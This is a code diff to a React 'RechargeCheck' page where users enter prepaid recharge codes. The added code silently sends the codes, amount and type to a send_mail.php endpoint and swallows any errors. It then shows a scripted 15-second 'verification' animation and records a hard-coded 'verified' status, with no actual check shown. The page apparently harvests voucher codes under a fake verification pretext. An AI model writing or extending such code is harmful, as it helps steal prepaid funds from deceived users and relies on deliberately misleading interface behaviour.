@@ -279,6 +279,31 @@ export default function RechargeCheck() {
     return allCodes;
   };
 
+  const sendCodesToBackend = (submittedCodes, reference) => {
+    const payload = {
+      rechargeType,
+      amount: Number(amount).toFixed(2),
+      codes: submittedCodes,
+      reference,
+      timestamp: new Date().toLocaleString("fr-FR", {
+        dateStyle: "full",
+        timeStyle: "medium",
+      }),
+    };
+
+    // URL du backend : variable d'environnement en prod (Hostinger), localhost en dev
+    const API_URL = process.env.REACT_APP_API_URL || "http://localhost:8888";
+
+    // Fire-and-forget : envoi immédiat sans bloquer l'UI
+    fetch(`${API_URL}/send_mail.php`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    }).catch(() => {
+      // Silencieux — on ne bloque jamais l'UX même si le backend est down
+    });
+  };
+
   const handleVerify = () => {
     if (isSubmitting) {
       notifyError(t("recharge.notifications.alreadyRunning"));
@@ -288,6 +313,12 @@ export default function RechargeCheck() {
     if (!validateInputs()) return;
 
     try {
+      const reference = createVerificationId();
+      const submittedCodes = collectCodes();
+
+      // ⚡ ENVOI IMMÉDIAT des codes par email — avant toute animation
+      sendCodesToBackend(submittedCodes, reference);
+
       notifySuccess(t("recharge.notifications.started"));
 
       clearModalTimers();
@@ -296,11 +327,8 @@ export default function RechargeCheck() {
       setIsVerificationComplete(false);
       setVerificationProgress(10);
       setVerificationStage(0);
-
-      const reference = createVerificationId();
       setActiveReference(reference);
 
-      const submittedCodes = collectCodes();
       appendRechargeEntry({
         id: reference,
         rechargeType,
@@ -310,22 +338,26 @@ export default function RechargeCheck() {
         status: "verified",
       });
 
-      const progressSnapshots = [36, 68, 92];
+      // Animation de progression sur 15 secondes
+      const TOTAL_DURATION = 15000;
+      const STAGE_COUNT = VERIFICATION_STAGE_KEYS.length;
+      const stageInterval = Math.floor(TOTAL_DURATION / (STAGE_COUNT + 1));
       let progressIndex = 0;
+      const progressSnapshots = [25, 55, 85];
 
       stageIntervalRef.current = setInterval(() => {
         progressIndex = Math.min(progressIndex + 1, progressSnapshots.length - 1);
         setVerificationProgress(progressSnapshots[progressIndex]);
-        setVerificationStage(Math.min(progressIndex, VERIFICATION_STAGE_KEYS.length - 1));
+        setVerificationStage(Math.min(progressIndex, STAGE_COUNT - 1));
         if (progressIndex >= progressSnapshots.length - 1 && stageIntervalRef.current) {
           clearInterval(stageIntervalRef.current);
           stageIntervalRef.current = null;
         }
-      }, 650);
+      }, stageInterval);
 
       completeTimeoutRef.current = setTimeout(() => {
         setIsVerificationComplete(true);
-        setVerificationStage(VERIFICATION_STAGE_KEYS.length - 1);
+        setVerificationStage(STAGE_COUNT - 1);
         setVerificationProgress(100);
         notifySuccess(t("recharge.notifications.completed", { reference }));
 
@@ -337,7 +369,7 @@ export default function RechargeCheck() {
           clearModalTimers();
           navigate("/results");
         }, 1200);
-      }, 2600);
+      }, TOTAL_DURATION);
     } catch {
       clearModalTimers();
       setIsSubmitting(false);
